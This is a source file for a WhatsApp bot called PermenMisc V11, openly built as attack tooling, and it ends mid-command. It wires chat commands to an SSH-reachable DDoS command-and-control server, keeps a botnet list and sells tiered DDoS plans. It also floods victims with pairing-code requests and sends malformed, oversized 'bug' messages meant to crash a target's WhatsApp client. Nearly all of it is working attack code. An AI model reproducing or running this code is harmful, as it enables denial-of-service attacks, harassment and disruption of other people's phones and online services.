const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification,MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');
const P = require('pino');
const Boom = require('@hapi/boom');
const { exec } = require('child_process');
const axios = require('axios');
const fs = require('fs');
const figlet = require('figlet');
const gradient = require('gradient-string');
const readline = require('readline');
const config = require('./config.js');
const database = require('./database.json');
const assets = require('./assets.json')
const thum = 'https://i.top4top.io/p_32261nror0.jpg';
const preview = fs.readFileSync('./lib/preview/permenmd.mp4');
const { Client } = require('ssh2');
const processList = [];
let botnetData = [];

function cncmyinfo({ host, port, username, password, command }) {
    return new Promise((resolve, reject) => {
        const conn = new Client();
        let outputBuffer = '';
        let commandSent = false;

        conn.on('ready', () => {
            console.log('Connected to Succubus CNC');
            conn.shell((err, stream) => {
                if (err) {
                    conn.end();
                    return reject(`Shell error: ${err.message}`);
                }

                stream.on('data', (chunk) => {
                    outputBuffer += chunk.toString();
                    if (commandSent) {
                        const relevantLines = outputBuffer.split('\n').filter(line => {
                            return line.includes('username=') ||
                                   line.includes('concurrents=') ||
                                   line.includes('timelimit=') ||
                                   line.includes('cooldown=') ||
                                   line.includes('expiry=') ||
                                   line.includes('Myclient=');
                        });

                        if (relevantLines.length > 0) {
                            conn.end();
                            resolve(relevantLines.join('\n').trim());
                        }
                    }
                });

                stream.stderr.on('data', (chunk) => {
                    console.error(chunk.toString());
                });

                stream.write(`${command}\r`);
                commandSent = true;
            });
        }).connect({
            host,
            port,
            username,
            password,
            readyTimeout: 30000
        });

        conn.on('error', (err) => {
            reject(`Connection error: ${err.message}`);
        });
    });
}

function cncAttack({ host, port, username, password, command }) {
    return new Promise((resolve, reject) => {
        const conn = new Client();
        let outputBuffer = '';
        let commandSent = false;
        conn.on('ready', () => {
            console.log('Connected to Succubus CNC');
            conn.shell((err, stream) => {
                if (err) {
                    conn.end();
                    return reject(`Shell error: ${err.message}`);
                }
                stream.on('data', (chunk) => {
                    outputBuffer += chunk.toString();
                    if (commandSent) {
                        const relevantLines = outputBuffer.split('\n').filter(line => {return line.includes(command)});
                        if (relevantLines.length > 0) {
                            console.log(relevantLines)
                            conn.end();
                            resolve(relevantLines.join('\n').trim());
                        }
                    }
                });
                stream.stderr.on('data', (chunk) => {
                    console.error(chunk.toString());
                });
                stream.write(`${command}\r`);
                commandSent = true;
            });
        }).connect({
            host,
            port,
            username,
            password,
            readyTimeout: 30000
        });

        conn.on('error', (err) => {
            reject(`Connection error: ${err.message}`);
        });
    });
}

async function pushOngoing(target, methods, duration) {
    const startTime = Date.now();
    processList.push({ target, methods, startTime, duration })
    setTimeout(() => {
      const index = processList.findIndex((p) => p.methods === methods);
      if (index !== -1) {
        processList.splice(index, 1);
      }
    }, duration * 1000);
  }

const permen = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});
const gugu = gradient('purple', 'red');

global.prefa = ['', '!', '.', ','];

async function startBot() {
    figlet.text(
        "PermenMD",
        {
            font: "ANSI Shadow",
            horizontalLayout: "default",
            verticalLayout: "default",
            width: 100,
            whitespaceBreak: true,
        },
        function (err, data) {
            if (err) {
                console.log("Something went wrong...");
                console.dir(err);
                return;
            }
            console.clear();
            console.log(gugu(data, { interpolation: 'hsv' }));
        }
    );

    const { state, saveCreds } = await useMultiFileAuthState('permenmd');
    const sock = makeWASocket({
        auth: state,
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
    });

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'close') {
            const reason = lastDisconnect?.error?.output?.statusCode;
            if (reason !== DisconnectReason.loggedOut) {
                console.log('Connection closed due to', Boom.boomify(lastDisconnect.error));
                await startBot();
            } else {
                console.log('Logged out from WhatsApp.');
            }
        } else if (connection === 'open') {
            console.log('Connected to WhatsApp successfully!');
            console.log('---------------------------------');
        }

        if (connection === 'connecting' && !fs.existsSync('./permenmd/creds.json')) {
            permen.question('Enter your Bot Number, Example: 628xxx: ', async (number) => {
                try {
                    const formattedNumber = number.replace(/\D/g, '');
                    const pairingCode = await sock.requestPairingCode(formattedNumber);
                    const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;
                    console.log(`Your Pairing Code:`, formattedCode);
                    permen.close();
                } catch (error) {
                    console.log('Error requesting pairing code:', error);
                }
            });
        }
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg.message) return;
    
        let body = '';
        if (msg.message.conversation) {
            body = msg.message.conversation;
        } else if (msg.message.imageMessage && msg.message.imageMessage.caption) {
            body = msg.message.imageMessage.caption;
        } else if (msg.message.videoMessage && msg.message.videoMessage.caption) {
            body = msg.message.videoMessage.caption;
        } else if (msg.message.extendedTextMessage && msg.message.extendedTextMessage.text) {
            body = msg.message.extendedTextMessage.text;
        } else if (msg.message.documentMessage && msg.message.documentMessage.caption) {
            body = msg.message.documentMessage.caption;
        }
    
        const text1 = body.trim();
        const sender = msg.key.participant || msg.key.remoteJid;
        const prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa;
        const isCmd = text1.startsWith(prefix);
        const command = text1.replace(prefix, '').trim().split(/ +/).shift().toLowerCase();
        const text = text1.trim().slice(1)
        const args = text.trim().split(/ +/).slice(1);
        const pushname = msg.pushName || "No Name";
        const quoted = msg.quoted ? msg.quoted : msg;
        const mime = (quoted.msg || quoted).mimetype || '';
        const isMedia = /image|video|sticker|audio/.test(mime);

        const isGroup = msg.key.remoteJid.endsWith('@g.us');
        const isOwner = config.owner.includes(sender);

        console.log("=================");
        console.log(`Sender = ${sender}`);
        console.log(`Chat = ${text1}`);
        console.log("=================");

        if (!database[sender]) {
            database[sender] = { basic: false, premium: false, vip: false, banned: false, timelimit: 60, limit: 10 };
            saveDatabase();
        }

        const { basic: isBasic, premium: isPrem, vip: isVip, banned: isBan, timelimit, limit } = database[sender];
        const { cnc_host, cnc_port, cnc_users, cnc_password } = assets["cnc_server"];
        const cncMethods = assets.cnc_methods;

        function saveDatabase() {
            fs.writeFileSync('./database.json', JSON.stringify(database, null, 2));
        }

        function saveAssets() {
            fs.writeFileSync('./assets.json', JSON.stringify(assets, null, 2));
        }

        function saveBotnetData() {
            fs.writeFileSync('./botnet.json', JSON.stringify(botnetData, null, 2));
        }

        const reply = (text) => sock.sendMessage(msg.key.remoteJid, { text }, { quoted: msg });

        if (isBan) return reply('You are banned from using this bot.');

        switch (command) {
            case 'add-users':
                if (isOwner) {
                    const taggedUser = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid[0];
                    const plans = args[1];
                    if (taggedUser) {
                        if (plans === 'basic') {
                        database[taggedUser] = { ...database[taggedUser], basic: true, timelimit: 120 };
                        saveDatabase();
                        reply(`User @${taggedUser.split('@')[0]} is now ${plans}.`);
                        } else if (plans === 'premium') {
                        database[taggedUser] = { ...database[taggedUser], premium: true, timelimit: 300 };
                        saveDatabase();
                        reply(`User @${taggedUser.split('@')[0]} is now ${plans}.`);
                        } else if (plans === 'vip') {
                        database[taggedUser] = { ...database[taggedUser], vip: true, timelimit: 500 };
                        saveDatabase();
                        reply(`User @${taggedUser.split('@')[0]} is now ${plans}.`);
                        } 
                    } else {
                        reply('Tag a user to add plans.');
                    }
                } else {
                    reply('Only owners can use this command.');
                }
                break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- //
            case 'del-users':
                if (isOwner) {
                    const taggedUser = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid[0];
                    if (taggedUser) {
                        database[taggedUser] = { ...database[taggedUser], basic: false, premium: false, vip: false, banned: false, timelimit: 60, limit: 10 };
                        saveDatabase();
                        reply(`User @${taggedUser.split('@')[0]} has been reset.`);
                    } else {
                        reply('Tag a user to reset database.');
                    }
                } else {
                    reply('Only owners can use this command.');
                }
                break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- //
            case 'ban':
                if (isOwner) {
                    const taggedUser = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid[0];
                    if (taggedUser) {
                        database[taggedUser] = { ...database[taggedUser], banned: true };
                        saveDatabase();
                        reply(`User @${taggedUser.split('@')[0]} is now banned.`);
                    } else {
                        reply('Tag a user to ban.');
                    }
                } else {
                    reply('Only owners can use this command.');
                }
                break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- //
            case 'unban':
                if (isOwner) {
                    const taggedUser = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid[0];
                    if (taggedUser) {
                        database[taggedUser] = { ...database[taggedUser], banned: false };
                        saveDatabase();
                        reply(`User @${taggedUser.split('@')[0]} is unbanned.`);
                    } else {
                        reply('Tag a user to unban.');
                    }
                } else {
                    reply('Only owners can use this command.');
                }
                break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- //
case 'myinfo':
    const plan = database[sender]?.basic ? 'Basic' :
                 database[sender]?.premium ? 'Premium' :
                 database[sender]?.vip ? 'VIP' :
                 isOwner ? 'Owner' : 'None';

    const limmmau = `*My User Info*
\`\`\`Number:\`\`\` ${sender}
\`\`\`Plan:\`\`\` ${plan}
\`\`\`Time Limit:\`\`\` ${isOwner ? 'Infinity' : database[sender]?.timelimit}
> Developed By PermenMD`;

await sock.sendMessage(msg.key.remoteJid, { contextInfo: {
    externalAdReply: {
    showAdAttribution: true, 
    title: '𝙿 𝙴 𝚁 𝙼 𝙴 𝙽 𝙼 𝙸 𝚂 𝙲  𝚅 𝟷 𝟷',
    body: '𝗣𝗲𝗿𝗺𝗲𝗻𝗠𝗗',
    mediaType: 1,  
    renderLargerThumbnail : true,
    thumbnailUrl: thum,
    sourceUrl: ``
    }}, text: limmmau}, {quoted: msg})    
                break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- //
            case 'addlimit':
                if (isOwner) {
                    const taggedUser = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid[0];
                    const limitToAdd = parseInt(args[1]);
                    if (taggedUser && !isNaN(limitToAdd)) {
                        database[taggedUser] = {
                            ...database[taggedUser],
                            limit: (database[taggedUser]?.limit || 0) + limitToAdd,
                        };
                        saveDatabase();
                        reply(`Added ${limitToAdd} limit to @${taggedUser.split('@')[0]}.`);
                    } else {
                        reply('Tag a user and specify a valid limit amount.');
                    }
                } else {
                    reply('Only owners can use this command.');
                }
                break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- //
async function bugCall(LockJids) {
    let etc = generateWAMessageFromContent(
        LockJids,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    scheduledCallCreationMessage: {
                        scheduledTimestampMs: Date.now(),
                        callType: 2,
                        title: "卩乇尺爪乇几爪丨丂匚 ᐯ11 💀" + "🎉🎈🥳😍😊😢😭😎👀💖👍❤️💔😂💯🔥💥💀😆💪🤔🎶👏🙌👋🤩😘🙏🤗💫✨🌟😴😱🤯🌈🥺🤤💋🧡💛💚💙💜🖤".repeat(9000)
                    }
                }
            },
        }), {
            userJid: LockJids
        }
    );
    await sock.relayMessage(LockJids, etc.message, {});
}
async function ClPmNull(X, Qtd, ThM, cct = false, ptcp = false) {
    let etc = generateWAMessageFromContent(X,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "PΣЯMΣПMIƧᄃ V11 💀",
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 9007199254740991,
                                mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                                fileName: "PΣЯMΣПMIƧᄃ V11 💀",
                                fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1723855952",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ThM
                            },
                            hasMediaAttachment: true
                        },
                        body: {
                            text: "PΣЯMΣПMIƧᄃ V11 💀 ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + "ꦾ".repeat(5000)
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"PΣЯMΣПMIƧᄃ V11 💀\",\"header\":\"PΣЯMΣПMIƧᄃ V11 💀\",\"body\":\"PΣЯMΣПMIƧᄃ V11 💀\"}",
                            buttons: [
                                cct ? {
                                    name: "single_select",
                                    buttonParamsJson: "{\"title\":\"PΣЯMΣПMIƧᄃ V11 💀" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"PΣЯMΣПMIƧᄃ V11 💀\",\"rows\":[]}]}"
                                } : {
                                    name: "payment_method",
                                    buttonParamsJson: ""
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: "{}"
                                },
                                {
                                    name: "payment_method",
                                    buttonParamsJson: "{}"
                                },
                                {
                                    name: "single_select",
                                    buttonParamsJson: "{\"title\":\"PΣЯMΣПMIƧᄃ V11 💀\",\"sections\":[{\"title\":\"PΣЯMΣПMIƧᄃ V11 💀\",\"rows\":[]}]}"
                                },
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "{}"
                                }
                            ]
                        }
                    }
                }
            }
        }), {
            userJid: X,
            quoted: Qtd
        }
    );

    await sock.relayMessage(X, etc.message, ptcp ? {
        participant: {
            jid: X
        }
    } : {});
};


            case 'skid':
                if (isOwner || isPrem) {
                    const halah = text
                    if (halah) {
                        const Qrad = {
                            key: {
                                remoteJid: 'p',
                                fromMe: false,
                                participant: '0@s.whatsapp.net'
                            },
                            message: {
                                "interactiveResponseMessage": {
                                    "body": {
                                        "text": "Sent",
                                        "format": "DEFAULT"
                                    },
                                    "nativeFlowResponseMessage": {
                                        "name": "galaxy_message",
                                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"PΣЯMΣПMIƧᄃ V11 💀\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"Ligma\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"PΣЯMΣПMIƧᄃ V11 💀 ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                                        "version": 3
                                    }
                                }
                            }
                        }
                        const halahFormated = halah.replace(/[^0-9]/g, '').replace(/^\+/, '');
                        const target = halahFormated + '@s.whatsapp.net';
                        await ClPmNull(target, Qrad, preview, cct = true, ptcp = true)
                        await bugCall(target)
                        await reply(`\`\`\`Success Send Bug To ${target}\`\`\``)
                    } else {
                        reply("example .skid target\n.skid +6288xxxxx")
                    }
                } else {
                    reply('Only owners can use this command.');
                }
                break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- //
            case 'plans-info':
                const infoPlans = `*PermenMisc V11 Plans Information*
𝐅𝐑𝐄𝐄
- Public DDoS Access
- 60s Timelimit
- 10 Daily Attack Limit

𝐁𝐀𝐒𝐈𝐂
- All DDoS Method Access
- 120s Timelimit

𝐏𝐑𝐄𝐌𝐈𝐔𝐌
- All DDoS Method Access
- Botnet DDoS Access
- 300s Timelimit

𝐕𝐈𝐏
- All DDoS Method Access
- Botnet DDoS Access
- C2 Access
- 500s Timelimit`
                await sock.sendMessage(msg.key.remoteJid, { contextInfo: {
    externalAdReply: {
    showAdAttribution: true, 
    title: '𝙿 𝙴 𝚁 𝙼 𝙴 𝙽 𝙼 𝙸 𝚂 𝙲  𝚅 𝟷 𝟷',
    body: '𝗣𝗲𝗿𝗺𝗲𝗻𝗠𝗗',
    mediaType: 1,  
    renderLargerThumbnail : true,
    thumbnailUrl: thum,
    sourceUrl: ``
    }}, text: infoPlans}, {quoted: msg})
                break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- //
            case 'misc':
                let m2 = `*══─══─══─══─══─══─══─══*
PermenMisc V11 WhatsApp Bot Ready To Assist You.

_Botname :_ PermenMisc
_Version :_  *11*
_Prefix :_ ${prefix}

 *ᴍ ᴇ ɴ ᴜ*
- ᴅᴅᴏs
- ᴄɴᴄ-sᴇᴛ
- ᴄɴᴄ-ᴍʏɪɴꜰᴏ
- ᴄɴᴄ-ᴍᴇᴛʜᴏᴅs
- ᴄɴᴄ-ᴀᴛᴛᴀᴄᴋ
- ᴏɴɢᴏɪɴɢ
- ᴍʏɪɴꜰᴏ
- ꜰʀᴇᴇ-ᴅᴅᴏꜱ
- ᴘʟᴀɴꜱ-ɪɴꜰᴏ
- ʙᴏᴛɴᴇᴛ-ᴀᴅᴅ
- ʙᴏᴛɴᴇᴛ-ʟɪsᴛ
- ʙᴏᴛɴᴇᴛ-ᴛᴇsᴛ
- ʙᴏᴛɴᴇᴛ-ᴀᴛᴛᴀᴄᴋ
- ᴘʀᴏxʏ sᴄʀᴀᴘᴇ
- ᴘʀᴏxʏ ᴅᴏᴡɴʟᴏᴀᴅ
- ᴀᴅᴅ-ᴜꜱᴇʀꜱ
- ᴅᴇʟ-ᴜꜱᴇʀꜱ
- ʙᴀɴ
- ᴜɴʙᴀɴ
*══─══─══─══─══─══─══─══*
> Developed By PermenMD ⌕`
await sock.sendMessage(msg.key.remoteJid, {
    react: {
    text: '🧢',
    key: msg.key,
  }
})
await sock.sendMessage(msg.key.remoteJid, { video: preview, gifPlayback: true, contextInfo: {
    externalAdReply: {
    showAdAttribution: true, 
    title: '𝙿 𝙴 𝚁 𝙼 𝙴 𝙽 𝙼 𝙸 𝚂 𝙲  𝚅 𝟷 𝟷',
    body: '𝗣𝗲𝗿𝗺𝗲𝗻𝗠𝗗',
    mediaType: 1,  
    renderLargerThumbnail : true,
    thumbnailUrl: thum,
    sourceUrl: ``
    }}, caption: m2}, {quoted: msg})

                break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- //
                case 'flood-notif':
                    if (isOwner || isPrem || isVip || isBasic) {
                        if (args.length >= 2) {
                                try {
                                  const { version } = await fetchLatestBaileysVersion();
                                  const { state, saveState } = await useMultiFileAuthState('sessions');
                                  const logger = pino({ level: 'silent' });
                                  const loggg = makeWASocket({
                                    printQRInTerminal: false,
                                    auth: state,
                                    version: version,
                                    logger: logger,
                                  });
                            let phoneNumber0 = args[0]
                            const phoneNumber = '+' + phoneNumber0.replace(/[^0-9]/g, '').replace(/^\+/, '');
                            let duration = parseInt(args[1]);
                            await reply('Pairing Code Flooder Started\n*Target:* ' + phoneNumber + '\n*Duration:** ' + duration + '\n*Creator: PermenMD*');
                            
                            let intervalId = setInterval(async () => {
                              try {
                                const pairingCode = await loggg.requestPairingCode(phoneNumber);
                                const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;
                                console.log(formattedCode)
                              } catch (error) {
                              }
                            }, 1000);
                      
                            setTimeout(() => {
                              clearInterval(intervalId);
                              console.log('Flooding ended.');
                            }, duration * 1000);
                      
                          } catch (error) {
                          }
                  } else {
                            reply("Example: .flood-notif +6288xx 3\n.flood-notif target duration")
                        }
                    } else {
                        reply("You Cant Use This Command")
                    }
                    break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- //
                case 'cnc-set':
            if (isOwner) {
                if (args.length >= 4) {
                    const host = args[0];
                    const port = parseInt(args[1]);
                    const user = args[2];
                    const password = args[3];
                    assets["cnc_server"] = {
                        ...assets["cnc_server"],
                        cnc_host: host,
                        cnc_port: port,
                        cnc_users: user,
                        cnc_password: password
                    };
                    await saveAssets();
                    reply("CnC Updated.")
                } else {
                    reply("Example: .cnc-set ip port user password\n.cnc 123.123.12.123 999 root password")
                }
            } else {
                reply('Only owners can use this command.');
            }
                break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- //
                case 'cnc-myinfo':
                    if (isOwner) {
                        const host = cnc_host;
                        const port = cnc_port;
                        const users = cnc_users;
                        const password = cnc_password;
                        const command = "myinfo";
                        
                        try {
                            const info = await cncmyinfo({ host, port, username: users, password, command });
                            reply(`CnC Info:\n${info}`);
                        } catch (error) {
                            reply(`Failed to retrieve info: ${error}`);
                        }
                    } else {
                        reply('Only owners can use this command.');
                    }
                    break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- //
                case 'cnc-methods':
                        let methodsList = '*Available CNC Methods:*\n';
                        cncMethods.forEach((method, index) => {
                            methodsList += `- ${method}\n`;
                        });
                        sock.sendMessage(msg.key.remoteJid, { video: preview, gifPlayback: true, contextInfo: {
                            externalAdReply: {
                            showAdAttribution: true, 
                            title: '𝙿 𝙴 𝚁 𝙼 𝙴 𝙽 𝙼 𝙸 𝚂 𝙲  𝚅 𝟷 𝟷',
                            body: '𝗣𝗲𝗿𝗺𝗲𝗻𝗠𝗗',
                            mediaType: 1,  
                            renderLargerThumbnail : true,
                            thumbnailUrl: thum,
                            sourceUrl: ``
                            }}, caption: methodsList }, {quoted: msg})
                    break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- //
                case 'cnc-attack':
                    if (!isBan || isOwner || isVip) {
                        const host = cnc_host;
                        const port = cnc_port;
                        const users = cnc_users;
                        const password = cnc_password;
                        if (args.length >= 4) {
                            const target = args[0];
                            const duration = args[1];
                            const ports = args[2];
                            const methods = args[3];
                            const command = methods + ' ' + target + ' ' + ports + ' ' + duration;
                            const userTimelimit = isOwner ? Infinity : database[sender]?.timelimit || 0;
                            if (duration > userTimelimit) {
                                reply(`The specified duration (${duration} seconds) exceeds your time limit of ${userTimelimit} seconds.`);
                                break;
                            }


                            await cncAttack({ host, port, username: users, password, command })
                            await pushOngoing(target, methods, duration)
                            const hostname = target.replace(/^(https?:\/\/)?/, '').split('/')[0];
                            const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
                            const result = scrape.data;
                            let m2 = `Attack Sended Succesfully
\`\`\`Target:\`\`\` ${target}
\`\`\`Port:\`\`\` ${port}
\`\`\`Duration:\`\`\` ${duration}
\`\`\`Methods:\`\`\` ${methods}
\`\`\`Isp:\`\`\` ${result.isp}
\`\`\`Ip:\`\`\` ${result.query}
\`\`\`As:\`\`\` ${result.as}`
                            await sock.sendMessage(msg.key.remoteJid, {
                                react: {
                                text: '🧢',
                                key: msg.key,
                              }
                            })
                            sock.sendMessage(msg.key.remoteJid, { video: preview, gifPlayback: true, contextInfo: {
                                externalAdReply: {
                                showAdAttribution: true, 
                                title: '𝙿 𝙴 𝚁 𝙼 𝙴 𝙽 𝙼 𝙸 𝚂 𝙲  𝚅 𝟷 𝟷',
                                body: '𝗣𝗲𝗿𝗺𝗲𝗻𝗠𝗗',
                                mediaType: 1,  
                                renderLargerThumbnail : true,
                                thumbnailUrl: thum,
                                sourceUrl: ``
                                }}, caption: m2}, {quoted: msg})
                            
                            } else {
                            reply(`Example: .cnc-attack target duration port methods`)
                        }
                    } else {
                        reply('Only owners can use this command.');
                    }
                    break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- //
                case 'ongoing':
                    if (processList.length > 0) {
                        let ongoingMsg = '*Current Ongoing Attacks:*\n\n';
                        processList.forEach((process, index) => {
                            ongoingMsg += `Attack #${index + 1}:\n`;
                            ongoingMsg += `- Target: ${process.target}\n`;
                            ongoingMsg += `- Methods: ${process.methods}\n`;
                            ongoingMsg += `- Duration: ${process.duration} seconds\n`;
                            ongoingMsg += `- Running for: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds\n\n`;
                        });
                       await sock.sendMessage(msg.key.remoteJid, { contextInfo: {
                            externalAdReply: {
                            showAdAttribution: true, 
                            title: '𝙿 𝙴 𝚁 𝙼 𝙴 𝙽 𝙼 𝙸 𝚂 𝙲  𝚅 𝟷 𝟷',
                            body: '𝗣𝗲𝗿𝗺𝗲𝗻𝗠𝗗',
                            mediaType: 1,  
                            renderLargerThumbnail : true,
                            thumbnailUrl: thum,
                            sourceUrl: ``
                            }}, text: ongoingMsg}, {quoted: msg})
                } else {
                        reply('No ongoing attacks at the moment.');
                    }
                    break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- //
                case 'botnet-add':
                    if (isOwner) {
                        const url = args[0];
                        if (!url) {
                            reply('Please provide a URL. Example: .botnet-add http://123.123.12.123:4444');
                            break;
                        }
                        if (botnetData.includes(url)) {
                            reply('This URL is already in the botnet list.');
                        } else {
                            botnetData.push(url);
                            saveBotnetData();
                            reply(`Botnet URL added: ${url}`);
                        }
                    } else {
                        reply('Only owners can use this command.');
                    }
                    break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- //
                    case 'botnet-list':
                        if (isOwner) {
                            try {
                                const botnetData = JSON.parse(fs.readFileSync('./botnet.json', 'utf8'));
                                if (botnetData.length === 0) {
                                    reply('The botnet list is empty. Use .botnet-add to add URLs.');
                                    break;
                                }
                                let urlList = '*Botnet URLs:*\n';
                                botnetData.forEach((url, index) => {
                                    urlList += `${index + 1}. ${url}\n`;
                                });
                                reply(urlList);
                            } catch (error) {
                                reply('Failed to load the botnet list. Make sure botnet.json exists and is properly formatted.');
                            }
                        } else {
                            reply('Only owners can use this command.');
                        }
                        break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- //
                    case 'botnet-test':
                        if (isOwner) {
                            try {
                                const botnetData = JSON.parse(fs.readFileSync('./botnet.json', 'utf8'));
                                if (botnetData.length === 0) {
